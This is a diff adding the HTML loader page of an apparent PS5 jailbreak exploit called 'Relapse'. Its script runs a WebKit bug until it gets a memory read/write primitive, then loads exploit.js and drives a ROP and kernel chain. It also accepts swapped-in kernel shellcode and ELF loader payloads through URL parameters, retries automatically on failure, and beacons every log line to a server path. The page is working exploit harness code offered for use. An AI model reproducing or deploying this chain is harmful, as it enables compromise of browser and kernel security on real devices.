@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HA Relapse</title>
+<link rel="stylesheet" href="payload-ui.css">
+<style>
+  html, body { margin: 0; padding: 0; background: #0c0c0f; }
+
+  /* The log is shown by default so the console screen is readable (you cannot
+     add a query flag when the User Guide redirects straight in). Pass ?log=0 to
+     hide it. */
+  #console { display: none; }
+  body.verbose #console {
+      display: block;
+      box-sizing: border-box;
+      min-height: 100vh;
+      padding: 10px 12px;
+      color: #dfe3ee;
+      font: 12px/1.45 ui-monospace, Consolas, monospace;
+      white-space: pre-wrap;
+      word-break: break-all;
+      overflow-y: auto;
+  }
+  #console div { padding: 1px 0; }
+  .LOG-DEBUG { color: #6f7480; }
+  .LOG-INFO { color: #b9c2ff; }
+  .LOG-LOG { color: #dfe3ee; }
+  .LOG-WARN { color: #ffd27d; }
+  .LOG-ERROR { color: #ff6b6b; }
+  .LOG-SUCCESS { color: #7dff9e; }
+</style>
+</head>
+<body>
+
+<div id="console"></div>
+
+<section id="relapse-payload-menu" aria-label="Payload loader">
+  <div class="eyebrow">HA RELAPSE · LOCAL NETWORK</div>
+  <h1>Relapse</h1>
+  <p id="payload-status" role="status" aria-live="polite">Waiting for Relapse…</p>
+  <div id="payload-home">
+    <div class="payload-actions">
+      <button id="primary-button" type="button" disabled><strong id="primary-name">Primary payload</strong><small id="primary-file"></small></button>
+      <button id="additional-button" type="button"><strong>Payloads</strong></button>
+    </div>
+  </div>
+  <button id="primary-ready" type="button" hidden>Primary payload started</button>
+  <div id="payload-additional" hidden>
+    <div class="payload-toolbar">
+      <button id="payload-back" type="button">Back</button>
+      <button id="restore-button" type="button" disabled>Restore payloads</button>
+      <button id="payload-refresh" type="button">Refresh list</button>
+    </div>
+    <p id="payload-empty">No additional payloads.</p>
+    <div id="payload-list"></div>
+  </div>
+  <button id="cancel-restore" type="button" hidden>Stop after current payload</button>
+</section>
+
+
+<script src="rop.js"></script>
+<script src="payload-ui.js"></script>
+<script src="firmware.js?v=4"></script>
+<script src="main.js?v=7"></script>
+
+<script>
+// main.js appends the offsets script for the detected firmware as its last act.
+// Everything downstream needs those globals, so publish a promise for them.
+window.offsetsReady = new Promise(function (resolve, reject) {
+    var script = document.querySelector('script[src^="offsets/"]');
+    if (!script) return reject(new Error("main.js never injected an offsets script"));
+    if (typeof OFFSET_wk_vtable_first_element !== "undefined") return resolve(script.src);
+    script.addEventListener("load", function () { resolve(script.src); });
+    script.addEventListener("error", function () {
+        reject(new Error("offsets script failed to load: " + script.src));
+    });
+});
+</script>
+
+<script src="syscalls.js"></script>
+
+<script>
+// Optional overrides, all off by default:
+//   ?kexp=<file>     use a different kernel shellcode blob
+//   ?elfldr=<file>   use a different ELF loader payload
+//   ?log=0           hide the on-screen progress log (shown by default)
+(function () {
+    var query = new URLSearchParams(location.search);
+    window.AIO_CFG = {};
+    if (query.get("kexp")) AIO_CFG.kexp = query.get("kexp");
+    if (query.get("elfldr")) AIO_CFG.elfldr = query.get("elfldr");
+    if (query.get("log") !== "0") document.body.classList.add("verbose");
+})();
+</script>
+
+<script type="module">
+// core.js's ?v= here and in mem.js MUST be identical. In ES modules the URL is
+// the module identity, so a mismatch loads two separate core.js instances: this
+// file would establish the primitive on one while mem.js promotes the other.
+import { establishPrimitive, fakeCellReleased, CORE_INSTANCE } from "./core.js?v=132";
+import { installWindowP, pairStatus, memCoreInstance } from "./mem.js?v=131";
+
+if (CORE_INSTANCE !== memCoreInstance)
+    throw new Error("core.js module skew: index.html and mem.js imported different ?v= URLs");
+
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+var __bseq=0;function __bcn(m){try{new Image().src="log/LT-s"+(++__bseq)+"-"+encodeURIComponent(String(m)).slice(0,400)+"?t="+Date.now();}catch(e){}}
+function print(message, level) {
+    __bcn(message);   // forward every log line to the beacon logger (sync XHR)
+    const line = document.createElement("div");
+    line.className = level || "LOG-LOG";
+    line.textContent = String(message);
+    const view = document.getElementById("console");
+    if (view) { view.appendChild(line); view.scrollTop = view.scrollHeight; }
+}
+
+function reportFailure(error) {
+    const message = String((error && error.message) || error)
+        + ((error && error.stack) ? " @" + error.stack : "");
+    print("FAILED: " + message, "LOG-ERROR");
+    try { window.__rep("PAGE-FAIL", message.slice(0, 400)); } catch (e) { /* best effort */ }
+
+    // Some PS5 WebKit/ROP runs fail transiently after the primitive is already
+    // established. The existing ROP worker explicitly tells us to reload in
+    // that case. Do one automatic recovery instead of making the user refresh
+    // the browser manually. Never loop: after one recovery, leave the failure
+    // visible so a genuine/non-transient error is not hidden.
+    const transient = /ROP worker never answered|rop thread ran away|ROP-TIMEOUT|core: gave up after .*attempts|Reload\./i.test(message);
+    if (!transient) return;
+
+    let retries = 0;
+    try { retries = parseInt(sessionStorage.getItem("relapse.auto-retry") || "0", 10) || 0; } catch (e) {}
+    if (retries >= 1) {
+        print("automatic retry already used; leaving the failure visible", "LOG-WARN");
+        return;
+    }
+
+    retries++;
+    try { sessionStorage.setItem("relapse.auto-retry", String(retries)); } catch (e) {}
+    print("transient exploit failure detected - automatic browser recovery 1/1...", "LOG-WARN");
+    setTimeout(() => {
+        try { history.replaceState(null, ""); } catch (e) {}
+        location.reload();
+    }, 900);
+}
+
+// main.js logs progress through window.jb when it is present.
+window.jb = { mark: (tag, detail) => print(detail ? tag + " " + detail : tag, "LOG-INFO") };
+
+window.addEventListener("error", (e) => print("error: " + (e && e.message), "LOG-ERROR"));
+window.addEventListener("unhandledrejection", (e) =>
+    print("rejected: " + String((e && e.reason && e.reason.message) || (e && e.reason)), "LOG-ERROR"));
+
+/** Run the WebKit bug until it yields a working userland read/write primitive. */
+async function establishUserlandPrimitive() {
+    if (globalThis.p && typeof globalThis.p.read8 === "function") {
+        print("reusing the existing primitive", "LOG-INFO");
+        return globalThis.p;
+    }
+
+    print("running the WebKit bug (placement retries itself)", "LOG-INFO");
+    try { history.replaceState(null, ""); } catch (e) { /* not fatal */ }
+    if (typeof globalThis.gc === "function") { try { globalThis.gc(); } catch (e) { /* ditto */ } }
+    await sleep(750);
+
+    const carrier = await establishPrimitive({
+        maxAttempts: 24,
+        onEvent(tag, detail, attempt) {
+            print((typeof attempt === "number" ? "[" + attempt + "] " : "") + tag
+                + (detail ? " " + detail : ""), "LOG-DEBUG");
+        },
+        beforeCriticalLoad() {
+            try { document.getElementById("console").offsetWidth; } catch (e) { /* layout poke */ }
+        },
+    });
+
+    installWindowP(carrier, {
+        onEvent(tag, detail) {
+            print(tag + " " + detail, "LOG-DEBUG");
+            try { window.__rep(tag, String(detail ?? "").slice(0, 400)); } catch (e) { /* ditto */ }
+        },
+    });
+    if (!pairStatus.promoted)
+        throw new Error("the primitive pair was not promoted: " + pairStatus.error);
+
+    if (typeof globalThis.gc === "function") { try { globalThis.gc(); } catch (e) { /* ditto */ } }
+    await sleep(1000);
+
+    const p = globalThis.p;
+    if (!p || typeof p.read8 !== "function") throw new Error("window.p was never published");
+    print("primitive up (fakeCellReleased=" + fakeCellReleased() + ")", "LOG-INFO");
+    return p;
+}
+
+async function run() {
+    const rejection = window.firmware.rejection();
+    if (rejection) throw new Error(rejection);
+
+    await offsetsReady;
+    print("firmware " + window.fw_str, "LOG-INFO");
+
+    const p = await establishUserlandPrimitive();
+
+    // Imported here rather than at the top of the file on purpose: a module's
+    // source text is on the heap before the groom runs, and the placement the
+    // WebKit bug depends on is sensitive to what is sitting there.
+    await import("./exploit.js");
+
+    // main() prepares the ROP worker and then drives the kernel chain.
+    await main(p);
+
+    // The payload DOM was built before the exploit. Only reveal it after elfldr is ready.
+    if (!window.__elfldrUp || typeof window.__sendPayload !== "function") return;
+}
+
+window.payloadUI = window.createPayloadUI({
+    document: document,
+    fetch: (url, options) => fetch(url, options),
+    send: (entry) => window.__sendPayload(entry),
+    sleep: sleep
+});
+// Fetch and lay out the user library before running any exploit code.
+payloadUI.prepare().then(run).then(async () => {
+    try { sessionStorage.removeItem("relapse.auto-retry"); } catch (e) {}
+    if (window.__elfldrUp && typeof window.__sendPayload === "function")
+        await payloadUI.ready(!!window.__relapseFreshSession);
+}).catch(reportFailure);
+</script>
+</body>
+</html>
